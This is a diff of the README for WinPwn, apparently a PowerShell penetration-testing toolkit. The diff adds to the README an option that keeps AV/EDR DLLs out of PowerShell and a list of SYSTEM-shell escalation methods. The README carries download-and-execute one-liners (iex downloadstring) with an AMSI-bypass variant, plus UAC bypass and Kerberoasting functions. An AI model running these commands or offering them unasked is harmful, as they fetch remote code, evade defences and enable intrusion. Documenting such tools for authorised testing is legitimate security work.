@@ -1,18 +1,25 @@
 [![](https://img.shields.io/badge/Donate-Bitcoin-blue.svg?style=flat)](https://blockchain.info/address/1MXReD1F4w5SUXK3phLVJ5M8KrXJHfecmZ)
 
 # WinPwn
-In many past internal penetration tests I often had problems with the existing Powershell Recon / Exploitation scripts due to missing proxy support. I often ran the same scripts one after the other to get information about the current system and/or the domain. To automate as many internal penetrationtest processes (reconnaissance as well as exploitation) and for the proxy reason I wrote my own script with automatic proxy recognition and integration. 
+In many past internal penetration tests I often had problems with the existing Powershell Recon / Exploitation scripts due to missing proxy support. I also often ran the same scripts one after the other to get information about the current system and/or the domain. To automate as many internal penetrationtest processes (reconnaissance as well as exploitation) and for the proxy reason I wrote my own script with automatic proxy recognition and integration. 
 The script is mostly based on well-known large other offensive security Powershell projects. They are loaded into RAM via IEX Downloadstring.
 
 Any suggestions, feedback, Pull requests and comments are welcome! 
 
 Just Import the Modules with:
+
 `Import-Module .\WinPwn.ps1` or 
 `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')`
 
 For AMSI Bypass use the following oneliner:
+
 `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/ObfusWinPwn.ps1')`
 
+Spawn a new protected PowerShell Process that is set to run with BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON process mitigation:
+
+`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1')`
+
+This prevents non-microsoft DLLs (e.g. AV/EDR products) to load into PowerShell.
 
 If you find yourself stuck on a windows system with no internet access - no problem at all, just use Offline_Winpwn.ps1, all scripts and executables are included.
 
@@ -68,6 +75,11 @@ Functions available after Import:
   * UAC Bypass cmstp technique, by Oddvar Moe
   * DiskCleanup UAC Bypass, by James Forshaw
   * DccwBypassUAC technique, by Ernesto Fernandez and Thomas Vanhoutte
+* #### `SYSTEMShell` ->
+  * Pop System Shell using CreateProcess
+  * Pop System Shell using NamedPipe Impersonation
+  * Pop System Shell using Token Manipulation
+  * Bind System Shell using UsoClient DLL load or CreateProcess
 * #### `shareenumeration` -> Invoke-Filefinder and Invoke-Sharefinder (Powerview / Powersploit)
 * #### `groupsearch` -> Get-DomainGPOUserLocalGroupMapping - find Systems where you have Admin-access or RDP access to via Group Policy Mapping (Powerview / Powersploit)
 * #### `Kerberoasting` -> Executes Invoke-Kerberoast in a new window and stores the hashes for later cracking
@@ -101,7 +113,7 @@ Functions available after Import:
 - [X] [411Hall](https://github.com/411Hall/) - JAWS
 - [X] [sense-of-security](https://github.com/sense-of-security/) - ADrecon
 - [X] [dafthack](https://github.com/dafthack/) - DomainPasswordSpray
-- [X] [rasta-mouse](https://github.com/rasta-mouse/) - Sherlock, AMsi Bypass
+- [X] [rasta-mouse](https://github.com/rasta-mouse/) - Sherlock, Amsi Bypass,  PPID Spoof & BlockDLLs
 - [X] [AlessandroZ](https://github.com/AlessandroZ/) - LaZagne
 - [X] [samratashok](https://github.com/samratashok/) - nishang
 - [X] [leechristensen](https://github.com/leechristensen/) - Random Repo
